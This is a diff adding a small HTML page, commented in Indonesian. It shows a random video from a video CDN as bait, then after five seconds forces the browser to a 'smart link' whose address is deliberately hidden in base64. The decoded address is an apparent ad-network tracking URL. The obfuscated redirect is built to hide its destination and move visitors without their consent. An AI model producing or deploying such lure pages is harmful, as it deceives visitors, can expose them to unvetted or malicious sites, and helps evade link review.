@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    background: black;
+    height: 100%;
+    overflow: hidden;
+  }
+
+  video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+</style>
+</head>
+<body>
+
+<video id="video" autoplay muted playsinline></video>
+
+<script>
+  // List video CDN
+  const videos = [
+    "https://cdn.videy.co/VYOSfCwz1.mp4",
+    "https://cdn.videy.co/hnkwmSJA1.mp4",
+    "https://cdn.videy.co/nlu6VKBo1.mp4",
+    "https://cdn2.videy.co/FdOEeVQT1.mp4"
+  ];
+
+  // Pilih random video
+  const randomVideo = videos[Math.floor(Math.random() * videos.length)];
+  const videoPlayer = document.getElementById("video");
+  videoPlayer.src = randomVideo;
+
+  // Smart link (disamarkan base64)
+  const encoded = "aHR0cHM6Ly9jb25kdWN0aXZlYnJlZWRzLmNvbS9nOGh0dTZmbjk/a2V5PWI4ZWVkZmJjMDEzMjliZmY4YzJiNmRhMWEwNjJmOGMy";
+  const decoded = atob(encoded);
+
+  // Redirect setelah 5 detik
+  setTimeout(() => {
+    window.location.href = decoded;
+  }, 5000);
+</script>
+
+</body>
+</html>
